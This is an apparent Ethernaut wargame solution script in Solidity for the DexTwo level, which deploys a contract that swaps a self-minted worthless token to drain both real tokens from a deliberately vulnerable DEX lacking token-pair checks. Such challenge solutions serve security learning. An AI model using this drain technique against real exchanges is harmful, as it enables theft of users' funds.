// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import {Script, console2} from "forge-std/Script.sol";
import {EthernautHelper} from "../setup/EthernautHelper.sol";

// NOTE You can import your helper contracts & create interfaces here
import {DexTwo} from "../../challenge-contracts/23-DexTwo.sol";
import {SwappableTokenTwo} from "../../challenge-contracts/23-DexTwo.sol";
import {IERC20} from "../../challenge-contracts/lib/openzeppelin-contracts-08/token/ERC20/IERC20.sol";

contract DexTwoSolution is Script, EthernautHelper {
    address constant LEVEL_ADDRESS = 0xf59112032D54862E199626F55cFad4F8a3b0Fce9;
    uint256 heroPrivateKey = vm.envUint("PRIVATE_KEY");

    function run() public {
        vm.startBroadcast(heroPrivateKey);
        // NOTE this is the address of your challenge contract
        // NOTE make sure to change original function into "_createInstance()" for the correct challengeInstance address.
        address challengeInstance = _createInstance(LEVEL_ADDRESS);

        ////////////////////////////////////////////////////////////////////////////////////
        // Start of Ric Li C's Solution
        ////////////////////////////////////////////////////////////////////////////////////
        // Step 1: Get the DexTwo contract;
        DexTwo dex = DexTwo(challengeInstance);

        // Step 2: Get contract addresses for token 1 and token 2;
        address token1 = dex.token1();
        address token2 = dex.token2();

        // Step 3: Get token 1 balance of the DexTwo contract;
        uint balanceDexOriginal = IERC20(token1).balanceOf(challengeInstance);

        // Step 5: Deploy Hacker contract and get its address;
        Hacker hacker = new Hacker(challengeInstance);
        address hackerAddress = address(hacker);

        // Step 7: Calling `swap()` function of the Hacker contract;
        hacker.swap();

        // Step 8: Confirm that the Hacker contract has successfully drain token 1 and token 2 from the DexTwo contract.
        uint balanceDex1 = IERC20(token1).balanceOf(challengeInstance);
        uint balanceDex2 = IERC20(token2).balanceOf(challengeInstance);
        uint balanceHacker1 = IERC20(token1).balanceOf(hackerAddress);
        uint balanceHacker2 = IERC20(token2).balanceOf(hackerAddress);
        require(balanceDex1 == 0, "DexTwo balance 1 check failed");
        require(balanceDex2 == 0, "DexTwo balance 2 check failed");
        require(
            balanceHacker1 == balanceDexOriginal,
            "Hacker balance 1 check failed"
        );
        require(
            balanceHacker2 == balanceDexOriginal,
            "Hacker balance 2 check failed"
        );

        ////////////////////////////////////////////////////////////////////////////////////
        // End of Ric Li C's Solution
        ////////////////////////////////////////////////////////////////////////////////////

        // SUBMIT CHALLENGE. (DON'T EDIT)
        bool levelSuccess = submitInstance(challengeInstance);
        require(levelSuccess, "Challenge not passed yet");
        vm.stopBroadcast();

        console2.log(successMessage(23));
    }
}

////////////////////////////////////////////////////////////////////////////////////
// Start of Ric Li C's Solution (Extra Contract)
// Additional contract codes to help solve this puzzle
////////////////////////////////////////////////////////////////////////////////////
contract Hacker {
    address addrDex;
    DexTwo dex;
    SwappableTokenTwo myToken;
    address token1;
    address token2;
    address token3;
    uint balance = 4;

    constructor(address dexAddress) {
        addrDex = dexAddress;
        dex = DexTwo(dexAddress);
        myToken = new SwappableTokenTwo(dexAddress, "My Token", "MT", balance);
        token1 = dex.token1();
        token2 = dex.token2();
        token3 = address(myToken);
    }

    function swap() external {
        SwappableTokenTwo(token3).approve(address(this), addrDex, balance);
        SwappableTokenTwo(token3).transfer(addrDex, 1);
        dex.swap(token3, token1, 1);
        dex.swap(token3, token2, 2);
    }
}
////////////////////////////////////////////////////////////////////////////////////
// End of Ric Li C's Solution (Extra Contract)
////////////////////////////////////////////////////////////////////////////////////
